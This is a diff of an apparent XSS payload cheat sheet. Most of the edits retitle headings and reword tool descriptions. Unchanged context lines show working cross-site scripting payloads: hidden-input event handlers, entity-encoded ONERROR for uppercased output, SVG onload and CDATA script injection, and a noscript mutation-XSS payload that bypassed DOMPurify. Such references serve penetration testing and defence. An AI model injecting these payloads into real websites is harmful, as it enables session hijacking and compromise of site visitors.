@@ -12,24 +12,23 @@
     - [UI Redressing](#ui-redressing)
     - [Javascript Keylogger](#javascript-keylogger)
     - [Other Ways](#other-ways)
-- [Identify an XSS endpoint](#identify-an-xss-endpoint)
+- [Identify an XSS Endpoint](#identify-an-xss-endpoint)
     - [Tools](#tools)
 - [XSS in HTML/Applications](#xss-in-htmlapplications)
     - [Common Payloads](#common-payloads)
     - [XSS using HTML5 tags](#xss-using-html5-tags)
-    - [XSS using a remote JS](#xss-using-a-remote-js)
-    - [XSS in hidden input](#xss-in-hidden-input)
-    - [XSS when payload is reflected capitalized](#xss-when-payload-is-reflected-capitalized)
-    - [DOM based XSS](#dom-based-xss)
+    - [XSS using a Remote JS](#xss-using-a-remote-js)
+    - [XSS in Hidden Input](#xss-in-hidden-input)
+    - [XSS in Uppercase Output](#xss-in-uppercase-output)
+    - [DOM Based XSS](#dom-based-xss)
     - [XSS in JS Context](#xss-in-js-context)
 - [XSS in Wrappers for URI](#xss-in-wrappers-for-uri)
     - [Wrapper javascript:](#wrapper-javascript)
     - [Wrapper data:](#wrapper-data)
     - [Wrapper vbscript:](#wrapper-vbscript)
-- [XSS in files](#xss-in-files)
+- [XSS in Files](#xss-in-files)
     - [XSS in XML](#xss-in-xml)
     - [XSS in SVG](#xss-in-svg)
-    - [XSS in SVG (short)](#xss-in-svg-short)
     - [XSS in Markdown](#xss-in-markdown)
     - [XSS in CSS](#xss-in-css)
 - [XSS in PostMessage](#xss-in-postmessage)
@@ -128,7 +127,7 @@ More exploits at [http://www.xss-payloads.com/payloads-list.html?a#category=all]
 - [Play Music](http://www.xss-payloads.com/payloads/scripts/playmusic.js.html)
 
 
-## Identify an XSS endpoint
+## Identify an XSS Endpoint
 
 This payload opens the debugger in the developer console rather than triggering a popup alert box.
 
@@ -251,7 +250,7 @@ Most tools are also suitable for blind XSS attacks:
 e.g: 14.rs/#alert(document.domain)
 ```
 
-### XSS in hidden input
+### XSS in Hidden Input
 
 ```javascript
 <input type="hidden" accesskey="X" onclick="alert(1)">
@@ -262,13 +261,13 @@ in newer browsers : firefox-130/chrome-108
 <input type="hidden" oncontentvisibilityautostatechange="alert(1)"  style="content-visibility:auto" >
 ```
 
-### XSS when payload is reflected capitalized
+### XSS in Uppercase Output
 
 ```javascript
 <IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
 ```
 
-### DOM based XSS
+### DOM Based XSS
 
 Based on a DOM XSS sink.
 
@@ -329,7 +328,7 @@ only IE
 vbscript:msgbox("XSS")
 ```
 
-## XSS in files
+## XSS in Files
 
 **NOTE:** The XML CDATA section is used here so that the JavaScript payload will not be treated as XML markup.
 
@@ -389,7 +388,7 @@ More comprehensive payload with svg tag attribute, desc script, foreignObject sc
 
 
 
-### XSS in SVG (short)
+#### Short SVG Payload
 
 ```javascript
 <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
@@ -399,7 +398,7 @@ More comprehensive payload with svg tag attribute, desc script, foreignObject sc
 <svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
 ```
 
-### XSS in SVG (nesting)
+### Nesting SVG and XSS
 
 Including a remote SVG image in a SVG works but won't trigger the XSS embedded in the remote SVG. Author: noraj.
 
@@ -500,6 +499,7 @@ document.getElementById('btn').onclick = function(e){
 XSS Hunter is deprecated, it was available at [https://xsshunter.com/app](https://xsshunter.com/app). 
 
 You can set up an alternative version 
+
 * Self-hosted version from [mandatoryprogrammer/xsshunter-express](https://github.com/mandatoryprogrammer/xsshunter-express)
 * Hosted on [xsshunter.trufflesecurity.com](https://xsshunter.trufflesecurity.com/)
 
@@ -511,9 +511,9 @@ You can set up an alternative version
 
 ### Other Blind XSS tools
 
-- [sleepy-puppy - Netflix](https://github.com/Netflix-Skunkworks/sleepy-puppy)
-- [bXSS - LewisArdern](https://github.com/LewisArdern/bXSS)
-- [ezXSS - ssl](https://github.com/ssl/ezXSS)
+- [Netflix-Skunkworks/sleepy-puppy](https://github.com/Netflix-Skunkworks/sleepy-puppy) - Sleepy Puppy XSS Payload Management Framework
+- [LewisArdern/bXSS](https://github.com/LewisArdern/bXSS) - bXSS is a utility which can be used by bug hunters and organizations to identify Blind Cross-Site Scripting. 
+- [ssl/ezXSS](https://github.com/ssl/ezXSS) - ezXSS is an easy way for penetration testers and bug bounty hunters to test (blind) Cross Site Scripting. 
 
 ### Blind XSS endpoint
 
@@ -540,19 +540,24 @@ Eg. payload
 
 Eg. one-line HTTP server:
 
-```
+```ps1
 $ ruby -run -ehttpd . -p8080
 ```
 
 ## Mutated XSS
 
-Use browsers quirks to recreate some HTML tags when it is inside an `element.innerHTML`.
+Use browsers quirks to recreate some HTML tags.
 
-Mutated XSS from Masato Kinugawa, used against DOMPurify component on Google Search. Technical blogposts available at https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/ and https://research.securitum.com/dompurify-bypass-using-mxss/.
+**Example**: Mutated XSS from Masato Kinugawa, used against [cure53/DOMPurify](https://github.com/cure53/DOMPurify) component on Google Search. 
 
 ```javascript
 <noscript><p title="</noscript><img src=x onerror=alert(1)>">
 ```
+
+Technical blogposts available at
+
+* https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/
+* https://research.securitum.com/dompurify-bypass-using-mxss/
 
 
 ## Labs
